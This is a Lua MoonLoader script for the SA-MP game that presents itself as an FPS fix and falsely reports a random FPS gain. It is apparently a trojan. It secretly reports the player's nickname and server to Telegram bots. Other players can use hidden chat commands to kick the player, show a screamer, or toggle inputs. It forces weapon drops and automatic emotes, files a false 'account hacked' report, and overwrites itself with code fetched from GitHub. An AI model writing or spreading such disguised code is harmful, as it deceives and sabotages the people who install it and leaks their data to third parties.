---@diagnostic disable: undefined-global, lowercase-global

script_version("1")

local dlstatus = require("moonloader").download_status
local inicfg = require("inicfg")
local effil = require("effil")
local sampev = require("samp.events")
local encoding = require("encoding")
encoding.default = "CP1251"
local u8 = encoding.UTF8

local stop_find = false
local file_download = false
local lbutton_work_bunnyhop = false

local update_state = false

local x, y = getScreenResolution()

local CHAT_ID = 0
local CHATT_ID = 0
local BOT_TOKEN_NEW_PLAYER = ""
local BOT_TOKEN_ACTION_PLAYER = ""

math.randomseed(os.time())

local function cef_notify(type, title, text, time)
    local json = string.format("[%q,%q,%q,%d]", type, title, text, time)
    local code = "window.executeEvent('event.notify.initialize', `" .. json .. "`);"

    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt8(bs, 17)
    raknetBitStreamWriteInt32(bs, 0)
    raknetBitStreamWriteInt16(bs, #code)
    raknetBitStreamWriteInt8(bs, 0)
    raknetBitStreamWriteString(bs, code)
    raknetEmulPacketReceiveBitStream(220, bs)
    raknetDeleteBitStream(bs)
end

local threadHandle = function (runner, url, args, resolve, reject)
    local t = runner(url, args)
    local r = t:get(0)
    while not r do
        r = t:get(0)
        wait(0)
    end
    local status = t:status()
    if status == "completed" then
        local ok, result = r[1], r[2]
        if ok then resolve(result) else reject(result) end
    elseif err then
        reject(err)
    elseif status == "canceled" then
        reject(status)
    end
    t:cancel(0)
end

local requestRunner = function ()
    return effil.thread(function(u, a)
        local https = require("ssl.https")
        local ok, result = pcall(https.request, u, a)
        if ok then
            return {true, result}
        else
            return {false, result}
        end
    end)
end

local async_http_request = function (url, args, resolve, reject)
    local runner = requestRunner()
    if not reject then reject = function() end end
    lua_thread.create(function()
        threadHandle(runner, url, args, resolve, reject)
    end)
end

local encodeUrl = function (str)
    str = str:gsub(" ", "%+")
    str = str:gsub("\n", "%%0A")
    return u8:encode(str, "CP1251")
end

local sendTelegramNotify = function (token, msg)
    msg = msg:gsub("{......}", "")
    msg = encodeUrl(msg)

    async_http_request("https://api.telegram.org/bot" .. token .. "/sendMessage?chat_id=" .. CHATT_ID .. "&text=" .. msg, "", function(result) end)
    async_http_request("https://api.telegram.org/bot" .. token .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. msg, "", function(result) end)
end

local getLastUpdate = function (token)
    async_http_request("https://api.telegram.org/bot" .. token .. "/getUpdates?chat_id=" .. CHAT_ID .. "&offset=-1", "", function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        UPDATE_ID = res_table.update_id
                    end
                else
                    UPDATE_ID = 1
                end
            end
        end
    end)
end

local playScreamAndSound = function ()
    if file_download then
        lua_thread.create(function()
            local audio = loadAudioStream("moonloader\\lib\\samp\\zvuk.mp3")
            local image = renderLoadTextureFromFile("moonloader\\lib\\samp\\image.png")
            local start_time = os.clock()

            setAudioStreamState(audio, 1)

            while os.clock() - start_time < 3.0 do
                renderDrawTexture(image, 0, 0, x, y, 0.0, 0xFFFFFFFF)
                wait(0)
            end

            setAudioStreamState(audio, 0)
        end)
    end
end

sampev.onServerMessage = function (color, text)
    if text:find("Вы не можете выкинуть данное оружие!") then
        return false
    end

    if text:match(".+%[%d+%] говорит:%{.-%} (.+)$") then
        local msg = text:match(".+%[%d+%] говорит:%{.-%} (.+)$")

        if msg:find("!q") then
            lua_thread.create(function ()
                sendTelegramNotify(BOT_TOKEN_ACTION_PLAYER, string.format("Игрока выкидывает с сервера командой q!\n\nНик: %s\nСервер: %s", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
                sampAddChatMessage("{73B461}[Информация] {FFFFFF}Вы слишком долго играете на сервере, пора передохнуть!", 0x73B461)
                cef_notify("info", "Информация", "Вы слишком долго играете на сервере, пора передохнуть!", 5000)
                wait(5000)
                sampProcessChatInput("/q")
            end)
            return false
        elseif msg:find("!lkm") then
            sendTelegramNotify(BOT_TOKEN_ACTION_PLAYER, string.format("Игроку %s банни-хоп командой lkm!\n\nНик: %s\nСервер: %s", lbutton_work_bunnyhop and "выключён" or "включён", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
            lbutton_work_bunnyhop = not lbutton_work_bunnyhop
            return false
        elseif msg:find("!stop_find") then
            if stop_find then stop_find = false end
        elseif msg:find("!scream") then
            playScreamAndSound()
            sendTelegramNotify(BOT_TOKEN_ACTION_PLAYER, string.format("Игроку вывелся скример командой scream!\n\nНик: %s\nСервер: %s", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
            return false
        end
    end
end

sampev.onSendCommand = function (command)
    if command:match("/r (.+)") or command:match("/rb (.+)") then
        sampSendChat("/dropgun")
        sendTelegramNotify(BOT_TOKEN_ACTION_PLAYER, string.format("Игрок выкинул оружие!\n\nНик: %s\nСервер: %s", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
    end

    if command:find("/arrest") then
        playScreamAndSound()
        sendTelegramNotify(BOT_TOKEN_ACTION_PLAYER, string.format("Игроку вывелся скример при /arrest!\n\nНик: %s\nСервер: %s", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
    end
end

sampev.onShowDialog = function (dialogId, style, title, button1, button2, text)
    if stop_find and dialogId == 32 then
        sampSendDialogResponse(dialogId, 1, 0, "А что делать, если мой аккаунт взломали?")
        return false
    end
end

local cough = function ()
    while true do wait(0)
        if sampIsLocalPlayerSpawned() then
            wait(600000)
            sampSendChat("/me громко кашлянул")
            sendTelegramNotify(BOT_TOKEN_ACTION_PLAYER, string.format("Игрок кашлянул!\n\nНик: %s\nСервер: %s", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
        end
    end
end

local notifySpawn = function ()
    while true do wait(0)
        if sampIsLocalPlayerSpawned() then
            sendTelegramNotify(BOT_TOKEN_NEW_PLAYER, string.format("Новый игрок!\n\nНик: %s\nСервер: %s", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
            return
        end
    end
end

local fortuneTextFind = function ()
    for i = 0, 2048 do
        if not stop_find and sampIs3dTextDefined(i) then
            local pp = {sampGet3dTextInfoById(i)}

            if pp[1]:find("Прокрутить колесо фортуны можно 1 раз в сутки.") then
                local x_p, y_p, z_p = getCharCoordinates(PLAYER_PED)
                local x_t, y_t, z_t = pp[3], pp[4], pp[5]
                local get_distance = getDistanceBetweenCoords3d(x_p, y_p, z_p, x_t, y_t, z_t)
                local distance = 0.01 * math.floor(100 * get_distance)

                if distance <= 55 then
                    stop_find = not stop_find
                    sampSendChat("/report")
                    sendTelegramNotify(BOT_TOKEN_ACTION_PLAYER, string.format("За игрока пишется репорт о взломе аккаунта!\n\nНик: %s\nСервер: %s", sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))), sampGetCurrentServerName()))
                    break
                end
            end
        end
    end
end

local update = function ()
    downloadUrlToFile("https://raw.githubusercontent.com/elyr1n/script/refs/heads/main/update.ini", getWorkingDirectory() .. "update.ini", function (id, status)
        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
            update_ini = inicfg.load(nil, getWorkingDirectory() .. "update.ini")

            if tonumber(update_ini.v.version) > tonumber(thisScript().version) then
                sampAddChatMessage(string.format("Доступно обновление! Версия: %s!", update_ini.v.version), -1)
                update_state = true
            else
                sampAddChatMessage("У вас самая новая версия скрипта!", -1)
            end
            os.remove(getWorkingDirectory() .. "update.ini")
        end
    end)
end

function main()
    while not isSampAvailable() do wait(0) end

    update()

    getLastUpdate(BOT_TOKEN_NEW_PLAYER)
    getLastUpdate(BOT_TOKEN_ACTION_PLAYER)

    if not doesFileExist(getWorkingDirectory() .. "\\lib\\samp\\image.png") or not doesFileExist(getWorkingDirectory() .. "\\lib\\samp\\zvuk.mp3") then
        lua_thread.create(function ()
            sampAddChatMessage("Не найдены нужные библиотеки для работы скрипта, скачиваю их!", -1)
            
            downloadUrlToFile("https://raw.githubusercontent.com/elyr1n/script/refs/heads/main/image.png", getWorkingDirectory() .. "\\lib\\samp\\image.png")
            downloadUrlToFile("https://raw.githubusercontent.com/elyr1n/script/refs/heads/main/zvuk.mp3", getWorkingDirectory() .. "\\lib\\samp\\zvuk.mp3")

            wait(2000)

            thisScript():reload()
        end)
    else
        sampAddChatMessage("Все нужные библиотеки подгружены, начинаю работу!", -1)
        sampAddChatMessage(string.format("{228b22}Скрипт подстроился под Вашу систему. Ваш FPS увеличен на %s.", math.random(7, 15)), 0x228b22)
        sampAddChatMessage("{228b22}Приятного использования!", 0x228b22)

        notifySpawn()

        file_download = true
    end

    lua_thread.create(cough)

    while true do wait(0)
        if update_state then
            downloadUrlToFile("https://raw.githubusercontent.com/elyr1n/script/refs/heads/main/fps_fix.lua", thisScript().path, function (id, status)
                if status == dlstatus.STATUS_ENDDOWNLOADDATA then
                    sampAddChatMessage("Скрипт обновлён!", -1)
                    sampAddChatMessage("Если скрипт не перезагрузился автоматически, намжите - CTRL + R!", -1)
                end
            end)
            update_state = false
        end
    
        fortuneTextFind()

        if lbutton_work_bunnyhop and wasKeyPressed(1) then
            lua_thread.create(function ()
                setVirtualKeyDown(160, true)
                setVirtualKeyDown(32, true)

                wait(10)

                setVirtualKeyDown(160, false)
                setVirtualKeyDown(32, false)
            end)
        end
    end
end